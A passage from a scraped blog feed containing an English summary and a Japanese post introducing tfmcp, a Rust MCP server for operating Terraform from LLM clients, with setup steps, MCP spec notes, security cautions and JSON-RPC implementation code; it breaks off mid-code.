MCP concept.MCP is a protocol that allows LLM clients like Cline or Cursor to connect with external services. Traditionally, LLMs could only \\"think\\" based on learned data, but with MCP, they gain the ability to \\"act\\" by connecting with external systems.MCP enables capabilities like:Editing files in NotionQuerying databasesChecking service statusEditing and operating local filesMCP is fundamentally a JSON-RPC-based protocol with three main components:Resources: Provide access to data (equivalent to REST API GET)Tools: Enable execution of actions (equivalent to REST API POST)Prompts: Guidance on how LLMs should use the servicetfmcp: Operating Terraform from LLMsNow, let me introduce tfmcp. It\'s a tool that utilizes MCP to enable operation of Terraform from LLMs (particularly Claude Desktop).Note: The image above is in Japanese but illustrates the tfmcp architecture.Main Features of tfmcpWith tfmcp, you can:Read and analyze Terraform configuration filesParse and explain Terraform plansApply Terraform configurationsManage Terraform stateCreate and modify configuration filesDemoHere\'s a demo of tfmcp working with Claude Desktop:In this demo, Claude operates a Terraform project through natural language commands.Installation and Setuptfmcp is written in Rust and can be easily installed using Cargo:cargo install tfmcpTo connect with Claude Desktop, find the path to the installed tfmcp executable and add it to Claude Desktop\'s configuration file:{     \\"mcpServers\\": {       \\"tfmcp\\": {         \\"command\\": \\"/path/to/your/tfmcp\\",         \\"args\\": [\\"mcp\\"],         \\"env\\": {           \\"HOME\\": \\"/Users/yourusername\\",           \\"PATH\\": \\"/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\\",           \\"TERRAFORM_DIR\\": \\"/path/to/your/terraform/project\\"      }    }  }}Technical Implementation in Rusttfmcp consists of these main components:tfmcp├── config      - Configuration management├── core        - Core logic├── mcp         - MCP protocol implementation├── shared      - Common utilities└── terraform   - Terraform integrationNote: The image above is in Japanese but illustrates the internal architecture of tfmcp.MCP Server ImplementationThe core of the MCP server is the McpHandler struct, which processes requests and executes appropriate Terraform commands:pub struct McpHandler<\'a> {    tfmcp: &\'a mut TfMcp,    initialized: bool,}impl<\'a> McpHandler<\'a> {    async fn handle_tools_call(        &mut self,        transport: &StdioTransport,        id: u64,        params_val: serde_json::Value,    ) -> anyhow::Result<()> {        let name = params_val            .get(\\"name\\")            .and_then(|v| v.as_str())            .unwrap_or(\\"\\");        match name {            \\"list_terraform_resources\\" => {                self.handle_list_terraform_resources(transport, id).await?;            }            \\"analyze_terraform\\" => {                self.handle_analyze_terraform(transport, id, &params_val).await?;            }            \\"get_terraform_plan\\" => {                self.handle_get_terraform_plan(transport, id).await?;            }            // Other tool handlers...        }        Ok(())    }}The MCP request/response flow:Note: The image above is in Japanese but illustrates the MCP request/response flow.Terraform ServiceThe Terraform service handles the actual integration with Terraform:pub struct TerraformService {    terraform_path: PathBuf,    project_directory: PathBuf,}impl TerraformService {    pub async fn apply(&self, auto_approve: bool) -> anyhow::Result<String> {        let mut args = vec![\\"apply\\", \\"-no-color\\"];        if auto_approve {            args.push(\\"-auto-approve\\");        }        let output = Command::new(&self.terraform_path)            .args(&args)            .current_dir(&self.project_directory)            .output()?;        // Output processing        // ...    }        // Other methods for Terraform operations}JSON-RPC Implementationtfmcp uses Rust to implement the JSON-RPC 2.0 protocol:Note: The image above is in Japanese but illustrates the JSON-RPC implementation.The message types and transport are defined as follows:#[derive(Debug, Clone, Serialize, Deserialize)]#[serde(untagged)]pub enum Message {    Request {        #[serde(rename = \\"jsonrpc\\")]        jsonrpc: String,        #[serde(rename = \\"method\\")]        method: String,        #[serde(rename = \\"id\\")]        id: u64,        #[serde(rename = \\"params\\")]        #[serde(skip_serializing_if = \\"Option::is_none\\")]        params: Option<serde_json::Value>,    },    Notification { /* ... */ },    Response { /* ... */ },}#[async_trait]pub trait Transport: Send + Sync {    async fn send(&self, message: Message) -> Result<(), Error>;    fn receive(&self) -> Pin<Box<dyn Stream<Item = Result<Message, Error>> + Send>>;    async fn close(&self) -> Result<(), Error>;}Security ConsiderationsWhen using MCP tools like tfmcp, be aware that:They can create, modify, and delete infrastructureThey have access to local files and potentially sensitive informationUntrusted MCP servers could pose security risksImplement these safety measures:Only install MCP servers from trusted sourcesGrant minimum required permissionsRun in sandboxed environments when possibleEnable audit loggingFilter sensitive informationConclusiontfmcp represents a step forward in integrating Terraform with LLMs. By leveraging the Model Context Protocol, it provides a natural language interface to infrastructure management, simplifying complex IaC (Infrastructure as Code) tasks.MCP itself acts as a bridge allowing AI models to safely access local resources and tools. The implementation is based on a simple JSON-RPC protocol, making it accessible for developers to create their own MCP servers for specific domains.The Rust implementation provides benefits like type safety, robust error handling, and efficient asynchronous processing, creating a reliable foundation for smooth interaction between AI and tools.Reference LinksModel Context Protocol Official DocumentationMCP GitHub RepositoryAnthropic\'s MCP Introduction Article","isoDate":"2025-03-10T00:11:44.000Z","dateMiliSeconds":1741565504000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"MCPでLLMに行動させる - Terraformを例とした tfmcp の紹介","link":"https://syu-m-5151.hatenablog.com/entry/2025/03/09/020057","contentSnippet":"はじめにこんにちは！今回は、私が最近開発した tfmcp というツールを紹介します。これは Terraform を LLM（大規模言語モデル）から操作できるようにするツールで、Model Context Protocol (MCP) を活用しています。github.comこのブログが良ければ読者になったり、GitHub リポジトリにStarをいただけると開発の励みになります。nwiizoをフォロワーしてくれるのもありがたいです。より良いツール開発のためのフィードバックもお待ちしています！MCP とは何か？記事を始める前に、まず MCP (Model Context Protocol) について簡単に説明しましょう。MCP についてより詳しい情報は、公式ドキュメント modelcontextprotocol.io や Anthropic の Model Context Protocol に関する記事 を参照してください。公式ドキュメントがとてもわかり分かりやすいのでそれ以外は読まなくても良いレベルです。MCP は Cline や Cursor などの LLM クライアントが外部サービスと連携するためのプロトコルです。従来の LLM は学習したデータに基づいて「考える」ことしかできませんでしたが、MCP を通じて外部と連携し、「行動する」能力を持つことができます。具体的には、MCP を使うことで以下のようなことが可能になります。Notion のファイル編集Supabase のデータベースクエリCloudflare のステータスチェックローカルファイルの編集や操作mcpserver.ccMCP がプロトコルとして統一されていることで、LLM プロバイダーやサービスを柔軟に切り替えることができるという大きなメリットがあります。modelcontextprotocol.ioMCP の仕組みMCP は基本的に JSON-RPC ベースのプロトコルで、詳細な仕様は modelcontextprotocol.io/docs/concepts/transports#message-format で確認できます。主要な構成要素は以下のとおりです。リソース（Resources）：データへのアクセスを提供（REST API の GET に相当）ツール（Tools）：アクションの実行を可能にする（REST API の POST に相当）プロンプト（Prompts）：LLM がどのようにサービスを使うべきかのガイダンスMCP の実装をサポートするための公式 SDK が複数の言語で提供されています(2024年3月9日 現在)。TypeScript SDKPython SDKKotlin SDKJava SDKRust SDKしかし、MCP は標準的な JSON-RPC プロトコルをベースとしているため、任意のプログラミング言語で独自に実装することも可能です。本プロジェクト tfmcp では、Rust で実装しています。ちなみにJSON−RPCについて詳しく知りたい場合は「Real World HTTP 第3版」を読むととても勉強になるのでオススメです。Real World HTTP 第3版 ―歴史とコードに学ぶインターネットとウェブ技術作者:渋川 よしきオライリージャパンAmazon今後、どうなってゆくかはRoadmapが存在しているのでぜひ、こちらを読んでもらいたいです。modelcontextprotocol.ioJSON-RPC の基本MCP は JSON-RPC 2.0 仕様に基づいており、以下の3種類のメッセージ形式が使われます。リクエスト：クライアントからサーバーへの要求{     \\"jsonrpc\\": \\"2.0\\",     \\"id\\": 1,     \\"method\\": \\"tools/call\\",     \\"params\\": { /* パラメータ */ }}レスポンス：サーバーからクライアントへの応答{     \\"jsonrpc\\": \\"2.0\\",     \\"id\\": 1,     \\"result\\": { /* 結果オブジェクト */ }}エラー時：{     \\"jsonrpc\\": \\"2.0\\",     \\"id\\": 1,     \\"error\\": {       \\"code\\": -32700,       \\"message\\": \\"エラーメッセージ\\"  }}通知：レスポンスを必要としないサーバーからの一方的なメッセージ{     \\"jsonrpc\\": \\"2.0\\",     \\"method\\": \\"$/log\\",     \\"params\\": { /* パラメータ */ }}新しいMCP仕様(2025-03-26)での変更点(追記)Model Context Protocol の2025-03-26版では、前バージョン(2024-11-05)から複数の重要な改善が導入されました。本記事では主要な変更点を解説します。1. OAuth 2.1に基づく認証仕様2025-03-26版の認証仕様では、OAuth 2.1に基づく包括的な認証の枠組みが追加されました。この変更はPR #133で提案され、約1ヶ月の議論を経て策定されました。重要なポイント:- 認証は任意実装(OPTIONAL)- HTTP-basedトランスポートは準拠すべき(SHOULD)- STDIOトランスポートでは環境変数から認証情報を取得- プロトコルの中核部分をクリーンに保つための関心事の分離を実現2. Streamable HTTPトランスポート旧仕様のHTTP+SSEトランスポートが、より柔軟なStreamable HTTPトランスポートに置き換えられました。PR #206で議論されたこの変更により:単一エンドポイント(例: /mcp)による統合設計SSEサポートが任意化(従来は必須)セッション識別用のMcp-Session-Idヘッダー導入完全ステートレスなサーバー実装が可能にWebSocketではなくSSEを選択した理由としては、単純なRPC的な使用でのオーバーヘッド削減やブラウザからのヘッダー制限などが挙げられています。3. JSON-RPCバッチングのサポートPR #228で追加されたJSON-RPCバッチングサポートは、MCPの効率性を大幅に向上させます:複数リクエスト/通知の一括送信が必須(MUST)に通信効率の向上、特に多数の小さなメッセージ交換時に効果的JSON-RPC仕様への完全準拠を実現これまでの仕様ではバッチングについて明示的に言及されておらず、多くのSDKがサポートしていない課題がありました。4. Tool annotationsの追加ツールの動作をより詳細に記述するためのTool annotationsが追加されました。schema.tsで定義されているこれらのプロパティにより:title: ツールの人間が読みやすいタイトルreadOnlyHint: 環境変更なしを示す(デフォルト: false)destructiveHint: 破壊的更新の可能性を示す(デフォルト: true)idempotentHint: 重複呼び出しの安全性(デフォルト: false)openWorldHint: 外部エンティティとの相互作用(デフォルト: true)これらはすべて「ヒント」であり、実際の動作を保証するものではありません。クライアントは信頼できないサーバーからのアノテーションに基づいてツール使用を判断すべきではありません。5. その他の機能強化PR #197でProgressNotificationにmessageフィールドが追加され、進捗説明が可能にPR #93でオーディオデータのサポートが追加され、マルチモーダル対応が強化PR #173で引数自動補完のサポートが明示的にタイムアウト処理のガイダンスが強化され、PR #226で接続ハングやリソース枯渇防止の仕組みが改善まとめModelContextProtocol 2025-03-26版では、認証仕様の追加、Streamable HTTPトランスポートの導入、JSON-RPCバッチングの必須化など、多くの重要な機能強化が行われました。変更履歴を見ると、MCPがより安全で柔軟、そして効率的なプロトコルへと進化していることが分かります。特に認証仕様の追加は実用性を高め、Streamable HTTPトランスポートはステートレスサーバー実装を可能にするなど、実装者にとって大きなメリットがもたらされています。tfmcp: Terraform を LLM から操作するさて、本題の tfmcp の紹介に移ります。tfmcp は Model Context Protocol を活用して、LLM（特に Claude Desktop など）から Terraform の操作を可能にするツールです。tfmcp の主な機能tfmcp を使うと、以下のようなことが可能になります。Terraform 設定ファイルの読み取りプロジェクト内の .tf ファイルを解析し構造を理解Terraform プランの解析terraform plan の結果を解析して LLM に伝えるTerraform の適用設定をインフラに適用する terraform apply を実行状態管理Terraform の状態ファイルを管理・読み取り設定ファイルの作成・修正新しい Terraform 設定の作成や既存の設定の変更デモClaude Desktop と連携している tfmcp のデモを見てみましょう：このデモでは、Claude が自然言語で Terraform プロジェクトを操作し、分析、実行しています。インストール方法tfmcp は Rust で書かれており、Cargo を使って簡単にインストールできます。cargo install tfmcpソースからのインストールも可能です。# リポジトリをクローンgit clone https://github.com/nwiizo/tfmcpcd tfmcp# ビルドとインストールcargo install --path .Claude Desktop との連携方法Claude Desktop と tfmcp を連携するには、以下の手順を行います。まず、tfmcp をインストールします。bashcargo install tfmcpインストールされた tfmcp 実行ファイルのパスを見つけます。bashwhich tfmcpClaude Desktop の設定ファイルを開き、以下の設定を追加します。{     \\"mcpServers\\": {       \\"tfmcp\\": {         \\"command\\": \\"/path/to/your/tfmcp\\",  // 実際のパスに置き換えてください         \\"args\\": [\\"mcp\\"],         \\"env\\": {           \\"HOME\\": \\"/Users/yourusername\\",  // あなたのユーザー名に置き換えてください           \\"PATH\\": \\"/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\\",           \\"TERRAFORM_DIR\\": \\"/path/to/your/terraform/project\\"  // オプション：Terraformプロジェクトのパス      }    }  }}Claude Desktop を再起動し、tfmcp ツールを有効にします。もし Terraform プロジェクトが存在しない場合、tfmcp は自動的に ~/terraform に基本的なサンプルプロジェクトを作成します。使用例tfmcp の使い方や詳細なドキュメントは GitHub リポジトリの README で確認できます。以下のようなシナリオで特に役立ちます。Terraform 設定の説明と理解「このプロジェクトで使われている Terraform リソースを分析して」設定の検証とトラブルシューティング「この Terraform プロジェクトのエラーを見つけて修正して」インフラの計画と適用「このプランを実行するとどうなるか説明して」「この変更を適用して結果を報告して」設定の自動生成「S3バケットとIAMポリシーを作成する Terraform コードを書いて」セキュリティに関する考慮事項tfmcp を使用する際には、以下の点に注意が必要です。tfmcp は Terraform コマンドをユーザーに代わって実行するため、インフラの作成、変更、削除が可能です本番環境では、適切な IAM 権限やロール境界を使用することを検討してくださいAI によって生成された Terraform プランは、適用前に必ず確認してくださいTerraform の状態ファイルに含まれる機密情報が AI アシスタントからアクセス可能になる可能性がありますMCP自体のセキュリティリスク作っていて思ったんですけどMCPはLLMにローカル環境への強いアクセス権を付与するので、本質的にセキュリティ上の懸念があります。普通にもう狙ってきていると思いますのでむやみやたらにインストールするのはやめましょう。サードパーティMCPサーバーのリスク: 信頼できない「野良MCPサーバー」をインストールすると、マルウェアや情報漏洩のリスクが高まります。MCPサーバーはローカルファイルシステムや他のリソースへのアクセス権を持つため、悪意のあるコードを実行される可能性があります。権限の過剰付与: MCPサーバーが必要以上の権限を持つと、攻撃者がLLMとの対話を通じてシステムリソースに不正アクセスする可能性があります。データ漏洩のリスク: ローカルファイルやクレデンシャルなどの機密情報が、LLMとの対話を通じて外部に漏洩する可能性があります。プロンプトインジェクション攻撃: 悪意あるプロンプトを通じて、MCPサーバーに予期しない操作を実行させるリスクがあります。安全なMCP利用のための注意事項以下の対策を実施することで、MCPの安全な利用が多少、可能になります。それでも完璧ではないです。金払ってくれるなら作ってやるから連絡してくれ。信頼できるソースからのみMCPサーバーをインストール: 公式リポジトリや信頼できる開発者からのMCPサーバーのみを使用し、コードを確認してから実行してください。最小権限の原則を適用: MCPサーバーには必要最小限の権限のみを付与し、特に本番環境や機密データへのアクセスは制限してください。サンドボックス環境での実行: 可能であれば、MCPサーバーを隔離された環境で実行し、重要なシステムやデータへのアクセスを制限してください。監査ログの有効化: MCPサーバーを通じて実行されたすべてのコマンドや操作を記録し、不審な活動がないかを定期的に確認してください。機密情報のフィルタリング: LLMに送信される前に、APIキーやパスワードなどの機密情報を検出・削除するメカニズムを実装してください。定期的なセキュリティレビュー: MCPサーバーの設定やコードを定期的にレビューし、セキュリティの脆弱性がないかを確認してください。確実なテストの実行: 本番環境に導入する前に、テスト環境でMCPの動作を徹底的に検証し、品質やセキュリティ上に問題や予期しない挙動がないことを確認してください。tfmcpを含むMCPサーバーは強力なツールですが、その力は適切に管理されなければリスクにもなり得ます。特に初めての利用時は、非本番環境でのテストから始め、リスクを理解した上で徐々に本番環境への導入を検討することをお勧めします。tfmcp の技術的詳細と実装tfmcp の内部実装について詳しく説明します。全体アーキテクチャtfmcp は大きく分けて以下のコンポーネントから構成されています。tfmcp├── config      - 設定管理├── core        - コアロジック├── mcp         - MCPプロトコル実装├── shared      - 共通ユーティリティ└── terraform   - Terraform連携主要コンポーネントの詳細1. MCP サーバー (src/mcp/)MCPサーバーは、LLMクライアント（Claude Desktopなど）との通信を処理する部分です。主に以下のファイルから構成されています。handler.rs: MCPリクエストの処理とレスポンスの生成stdio.rs: 標準入出力を使った通信の実装handler.rs の核となる部分は McpHandler 構造体で、リクエストに応じて適切なTerraformコマンドを実行します。pub struct McpHandler<\'a> {    tfmcp: &\'a mut TfMcp,    initialized: bool,}impl<\'a> McpHandler<\'a> {    // ...    async fn handle_tools_call(        &mut self,        transport: &StdioTransport,        id: u64,        params_val: serde_json::Value,    ) -> anyhow::Result<()> {        let name = params_val            .get(\\"name\\")            .and_then(|v| v.as_str())            .unwrap_or(\\"\\");        match name {            \\"list_terraform_resources\\" => {                self.handle_list_terraform_resources(transport, id).await?;         }            \\"analyze_terraform\\" => {                self.handle_analyze_terraform(transport, id, &params_val).await?;         }            \\"get_terraform_plan\\" => {                self.handle_get_terraform_plan(transport, id).await?;         }            // 他のツール処理...     }        Ok(()) }        // 各ツールの実装...}MCPのリクエスト/レスポンスフローを図示すると次のようになります。2. Terraform サービス (src/terraform/)Terraformとの実際の連携を担当するコンポーネントです。主に以下のファイルで構成されています。service.rs: Terraformコマンドの実行とその結果の解析model.rs: Terraformの設定やステート用のデータモデルTerraformService 構造体が主要なインターフェースを提供します。pub struct TerraformService {    terraform_path: PathBuf,  // terraform実行ファイルのパス    project_directory: PathBuf,  // Terraformプロジェクトのディレクトリ}impl TerraformService {    // 初期化    pub fn new(        terraform_path: PathBuf,        project_directory: PathBuf,    ) -> Result<Self, TerraformError> {        // ... 検証ロジック ... }    // プロジェクトディレクトリの変更    pub fn change_project_directory(        &mut self,        new_directory: PathBuf,    ) -> Result<(), TerraformError> {        // ... ディレクトリ変更ロジック ... }    // Terraformコマンドの実行    pub async fn apply(&self, auto_approve: bool) -> anyhow::Result<String> {        let mut args = vec![\\"apply\\", \\"-no-color\\"];        if auto_approve {            args.push(\\"-auto-approve\\");     }        let output = Command::new(&self.terraform_path)            .args(&args)            .current_dir(&self.project_directory)            .output()?;        // ... 出力処理 ... }    // 設定ファイルの解析    pub async fn analyze_configurations(&self) -> anyhow::Result<TerraformAnalysis> {        // ... 解析ロジック ... }    // その他のメソッド...}3. コア (src/core/)TfMcp 構造体は、アプリケーションの中心的なコントローラーとして機能し、MCPハンドラーとTerraformサービスを橋渡しします。pub struct TfMcp {    config: Config,    terraform_service: TerraformService,}impl TfMcp {    pub fn new(config_path: Option<String>, project_dir: Option<String>) -> anyhow::Result<Self> {        // ... 初期化ロジック ... }    pub async fn launch_mcp(&mut self) -> anyhow::Result<()> {        // ... MCPサーバー起動ロジック ... }    // Terraformサービスへの橋渡し    pub async fn analyze_terraform(&mut self) -> anyhow::Result<()> {        let analysis = self.terraform_service.analyze_configurations().await?;        println!(\\"{}\\", serde_json::to_string_pretty(&analysis)?);        Ok(()) }    // その他のメソッド...}4. 設定管理 (src/config/)アプリケーションの設定を管理します。設定ファイルからの読み込みと、デフォルト設定の提供を担当します。pub struct Config {    pub terraform: TerraformConfig,    pub mcp: McpConfig,}pub fn init_default() -> anyhow::Result<Config> {    // ... デフォルト設定ロジック ...}pub fn init_from_path(path: &str) -> anyhow::Result<Config> {    // ... 設定ファイル読み込みロジック ...}実装の特徴高速なパフォーマンス：Rust のエコシステムを活用した高速な処理自動セットアップ：必要に応じてサンプル Terraform プロジェクトを自動作成エラー処理：適切なエラーメッセージとロギングプロジェクトディレクトリの動的切り替え：実行中にプロジェクトディレクトリを変更可能Rust での JSON-RPC 2.0 実装tfmcp では Rust で JSON-RPC 2.0 を実装するために、標準的なアプローチを採用しています。以下は JSON-RPC メッセージの定義と処理の詳細な実装方法です。1. 依存パッケージの設定まず、Cargo.toml に必要な依存関係を定義します。[dependencies]serde = { version = \\"1.0\\", features = [\\"derive\\"] }serde_json = \\"1.0\\"anyhow = \\"1.0\\"thiserror = \\"1.0\\"tokio = { version = \\"1.0\\", features = [\\"full\\"] }futures = \\"0.3\\"async-trait = \\"0.1\\"2. メッセージ構造体とエラー型の定義use serde::{Deserialize, Serialize};use std::pin::Pin;use std::sync::{Arc, Mutex};use tokio::sync::broadcast;use futures::Stream;use async_trait::async_trait;// JSON-RPC エラーコード#[derive(Debug)]#[allow(dead_code)]pub enum JsonRpcErrorCode {    ParseError = -32700,    InvalidRequest = -32600,    MethodNotFound = -32601,    InvalidParams = -32602,    InternalError = -32603,    // カスタムエラーコード（-32000 から -32099 の範囲）    TerraformNotFound = -32000,    InvalidProjectDirectory = -32001,}// トランスポートエラー#[derive(thiserror::Error, Debug, Clone)]pub enum Error {    #[error(\\"IO error: {0}\\")]    Io(String),        #[error(\\"Serialization error: {0}\\")]    Serialization(String),        #[error(\\"Other error: {0}\\")]    Other(String),}// JSON-RPC メッセージ#[derive(Debug, Clone, Serialize, Deserialize)]#[serde(untagged)]pub enum Message {    Request {        #[serde(rename = \\"jsonrpc\\")]        jsonrpc: String,        #[serde(rename = \\"method\\")]        method: String,        #[serde(rename = \\"id\\")]        id: u64,        #[serde(rename = \\"params\\")]        #[serde(skip_serializing_if = \\"Option::is_none\\")]        params: Option<serde_json::Value>, },    Notification {        #[serde(rename = \\"jsonrpc\\")]        jsonrpc: String,        #[serde(rename = \\"method\\")]        method: String,        #[serde(rename = \\"params\\")]        #[serde(skip_serializing_if = \\"Option::is_none\\")]        params: Option<serde_json::Value>, },    Response {        #[serde(rename = \\"jsonrpc\\")]        jsonrpc: String,        #[serde(rename = \\"id\\")]        id: u64,        #[serde(rename = \\"result\\")]        #[serde(skip_serializing_if = \\"Option::is_none\\")]        result: Option<serde_json::Value>,        #[serde(rename = \\"error\\")]        #[serde(skip_serializing_if = \\"Option::is_none\\")]        error: Option<serde_json::Value>, },}ここで重要なのは：#[serde(untagged)] アノテーションにより、3種類のメッセージタイプを同じ列挙型で表現#[serde(skip_serializing_if = \\"Option::is_none\\")] で null 値のフィールドを出力しない設定thiserror を使った明確なエラー型の定義3. トランスポートトレイトとその実装JSON-RPC メッセージの送受信を行うための抽象インターフェースとして、トランスポートトレイトを定義します。#[async_trait]pub trait Transport: Send + Sync {    // メッセージを送信する    async fn send(&self, message: Message) -> Result<(), Error>;        // メッセージストリームを受け取る    fn receive(&self) -> Pin<Box<dyn Stream<Item = Result<Message, Error>> + Send>>;        // トランスポートを閉じる    async fn close(&self) -> Result<(), Error>;}標準入出力を使ったトランスポート実装例：pub struct StdioTransport {    stdout: Arc<Mutex<std::io::Stdout>>,    receiver: broadcast::Receiver<Result<Message, Error>>,}impl StdioTransport {    pub fn new() -> (Self, broadcast::Sender<Result<Message, Error>>) {        let (sender, receiver) = broadcast::channel(100);        let transport = Self {            stdout: Arc::new(Mutex::new(std::io::stdout())),            receiver,     };        // 標準入力からの読み取りをバックグラウンドで実行        let stdin = tokio::io::stdin();        let mut reader = tokio::io::BufReader::new(stdin);        let sender_clone = sender.clone();        tokio::spawn(async move {            let mut line = String::new();            loop {                line.clear();                match reader.read_line(&mut line).await {                    Ok(0) => break, // EOF                    Ok(_) => {                        // 空白を除去して解析の問題を回避                        let trimmed_line = line.trim();                        eprintln!(\\"[DEBUG] Received JSON: {}\\", trimmed_line);                                                // JSON-RPC メッセージを解析                        let parsed = parse_json_message(trimmed_line);                        if sender_clone.send(parsed).is_err() {                            eprintln!(\\"[ERROR] Failed to send parsed message to channel\\");                            break;                     }                 }                    Err(e) => {                        eprintln!(\\"[ERROR] Error reading from stdin: {}\\", e);                        let _ = sender_clone.send(Err(Error::Io(                            format!(\\"Error reading from stdin: {}\\", e))                        ));                        break;                 }             }         }     });        (transport, sender) }}#[async_trait]impl Transport for StdioTransport {    async fn send(&self, message: Message) -> Result<(), Error> {        let mut stdout = self.stdout.lock()            .map_err(|_| Error::Other(\\"Failed to lock stdout\\".into()))?;        // メッセージを JSON 文字列に変換        let json = match serde_json::to_string(&message) {            Ok(s) => s,            Err(e) => return Err(Error::Serialization(                format!(\\"JSON serialization error: {}\\", e)            )),     };        // デバッグログ用に送信するJSONを出力        let truncated_json = if json.len() > 500 {            format!(\\"{}... (truncated)\\", &json[0..500])     } else {            json.clone()     };        eprintln!(\\"[DEBUG] Sending JSON: {}\\", truncated_json);        // JSON 文字列を改行付きで出力し、フラッシュ        if let Err(e) = writeln!(stdout, \\"{}\\", json) {            return Err(Error::Io(format!(\\"Failed to write to stdout: {}\\", e)));     }        if let Err(e) = stdout.flush() {            return Err(Error::Io(format!(\\"Failed to flush stdout: {}\\", e)));     }        Ok(()) }    fn receive(&self) -> Pin<Box<dyn Stream<Item = Result<Message, Error>> + Send>> {        let rx = self.receiver.resubscribe();        Box::pin(futures::stream::unfold(rx, |mut rx| async move {            match rx.recv().await {                Ok(msg) => Some((msg, rx)),                Err(_) => None,         }     })) }    async fn close(&self) -> Result<(), Error> {        Ok(()) }}よりロバストなJSONパース処理の実装：// エラー対応の改善されたJSONメッセージパース関数fn parse_json_message(json_string: &str) -> Result<Message, Error> {    // 空入力のバリデーション    if json_string.is_empty() {        return Err(Error::Serialization(\\"Empty JSON string\\".into())); }    // 一般的なJSON問題を修正    let mut processed_json = json_string.to_string();    // 問題のある空白文字を除去    processed_json = processed_json.replace([\'\\\\n\', \'\\\\r\', \'\\\\t\'], \\" \\");    // エスケープされていないバックスラッシュと引用符の処理    if processed_json.contains(\\"\\\\\\\\\\\\\\\\\\") || processed_json.contains(\\"\\\\\\\\\\\\\\"\\") {        processed_json = processed_json            .replace(\\"\\\\\\\\\\\\\\\\\\", \\"\\\\\\\\\\")            .replace(\\"\\\\\\\\\\\\\\"\\", \\"\\\\\\"\\"); }    // 修正された文字列で解析を試行    let parse_result = serde_json::from_str::<Message>(&processed_json);    match parse_result {        Ok(msg) => Ok(msg),        Err(e) => {            eprintln!(\\"[ERROR] JSON parse error: {}. Input: {}\\", e, processed_json);            // 追加診断情報の提供            if let Ok(value) = serde_json::from_str::<serde_json::Value>(&processed_json) {                eprintln!(\\"[DEBUG] JSON parsed as generic value: {:?}\\", value);         } else {                eprintln!(\\"[ERROR] Could not parse JSON even as generic value\\");         }            Err(Error::Serialization(format!(\\"JSON parse error: {}\\", e)))     } }}4. リクエスト処理とメソッドディスパッチMCP サーバー内でのリクエスト処理は、メソッド名に基づいてディスパッチ（振り分け）します。pub struct McpHandler<\'a> {    tfmcp: &\'a mut TfMcp,    initialized: bool,}impl<\'a> McpHandler<\'a> {    pub fn new(tfmcp: &\'a mut TfMcp) -> Self {        Self {            tfmcp,            initialized: false,     } }    pub async fn launch_mcp(&mut self, transport: &StdioTransport) -> anyhow::Result<()> {        let mut stream = transport.receive();        logging::info(\\"MCP stdio transport server started. Waiting for JSON messages on stdin...\\");                // メッセージループ        while let Some(msg_result) = stream.next().await {            match msg_result {                Ok(Message::Request { id, method, params, .. }) => {                    logging::debug(&format!(                        \\"Got Request: id={}, method={}, params={:?}\\",                        id, method, params                    ));                    // 初期化リクエストの特別処理                    if method == \\"initialize\\" {                        if let Err(err) = self.handle_initialize(transport, id).await {                            logging::error(&format!(\\"Error handling initialize request: {}\\", err));                     }                        self.initialized = true;                        continue;                 }                    // 他のすべてのリクエストでは、初期化されていることを確認                    if !self.initialized {                        self.send_error_response(                            transport,                            id,                            JsonRpcErrorCode::InvalidRequest,                            \\"Server not initialized. Send \'initialize\' request first.\\".to_string(),                        ).await?;                        continue;                 }                    // リクエスト処理の実行                    if let Err(err) = self.handle_request(transport, id, method, params).await {                        logging::error(&format!(\\"Error handling request: {:?}\\", err));                        self.send_error_response(                            transport,                            id,                            JsonRpcErrorCode::InternalError,                            format!(\\"Failed to handle request: {}\\", err),                        ).await?;                 }             }                Ok(Message::Notification { method, params, .. }) => {                    logging::debug(&format!(\\"Got Notification: method={}, params={:?}\\", method, params));                    // 通知の処理（必要に応じて）             }                Ok(Message::Response { id, result, error, .. }) => {                    logging::debug(&format!(                        \\"Got Response: id={}, result={:?}, error={:?}\\",                        id, result, error                    ));                    // レスポンスの処理（必要に応じて）             }                Err(e) => {                    logging::error(&format!(\\"Error receiving message: {:?}\\", e));             }         }     }        Ok(()) }    async fn handle_request(        &mut self,        transport: &StdioTransport,        id: u64,        method: String,        params: Option<serde_json::Value>,    ) -> anyhow::Result<()> {        match &*method {            \\"initialize\\" => self.handle_initialize(transport, id).await?,            \\"tools/list\\" => self.handle_tools_list(transport, id).await?,            \\"tools/call\\" => {                if let Some(params_val) = params {                    self.handle_tools_call(transport, id, params_val).await?;             }         }            \\"resources/list\\" => self.handle_resources_list(transport, id).await?,            \\"prompts/list\\" => self.handle_prompts_list(transport, id).await?,            _ => {                self.send_error_response(                    transport,                    id,                    JsonRpcErrorCode::MethodNotFound,                    format!(\\"Method not found: {}\\", method),                ).await?;         }     }        Ok(()) }}5. レスポンス送信メソッド成功レスポンスとエラーレスポンスのヘルパーメソッド：impl<\'a> McpHandler<\'a> {    // テキストコンテンツを持つレスポンスを送信    async fn send_text_response(        &self,        transport: &StdioTransport,        id: u64,        text: &str,    ) -> anyhow::Result<()> {        logging::info(&format!(\\"Sending text response for id {}\\", id));        // 適切に構造化されたテキストレスポンスを作成        let response = Message::Response {            jsonrpc: \\"2.0\\".to_string(),            id,            result: Some(json!({                \\"content\\": [{                    \\"type\\": \\"text\\",                    \\"text\\": text             }]         })),            error: None,     };        // レスポンスをログに記録（デバッグ用）        if let Ok(json_str) = serde_json::to_string_pretty(&response) {            logging::debug(&format!(\\"Sending text response: {}\\", json_str));     }        // レスポンスを送信        match transport.send(response).await {            Ok(_) => {                logging::info(\\"Text response sent successfully\\");                Ok(())         }            Err(e) => {                logging::error(&format!(\\"Failed to send text response: {}\\", e));                Err(anyhow::anyhow!(\\"Failed to send text response: {}\\", e))         }     } }    // エラーレスポンスを送信    async fn send_error_response(        &self,        transport: &StdioTransport,        id: u64,        code: JsonRpcErrorCode,        message: String,    ) -> anyhow::Result<()> {        logging::warn(&format!(            \\"Sending error response for id {}: {}\\",            id, message        ));        // 適切に構造化されたエラーレスポンスを作成        let response = Message::Response {            jsonrpc: \\"2.0\\".to_string(),            id,            result: None,            error: Some(json!({                \\"code\\": code as i32,                \\"message\\": message         })),     };        // レスポンスをログに記録（デバッグ用）        if let Ok(json_str) = serde_json::to_string_pretty(&response) {            logging::debug(&format!(\\"Sending error response: {}\\", json_str));     }        // レスポンスを送信        match transport.send(response).await {            Ok(_) => {                logging::info(\\"Error response sent successfully\\");                Ok(())         }            Err(e) => {                logging::error(&format!(\\"Failed to send error response: {}\\", e));                Err(anyhow::anyhow!(\\"Failed to send error response: {}\\", e)) 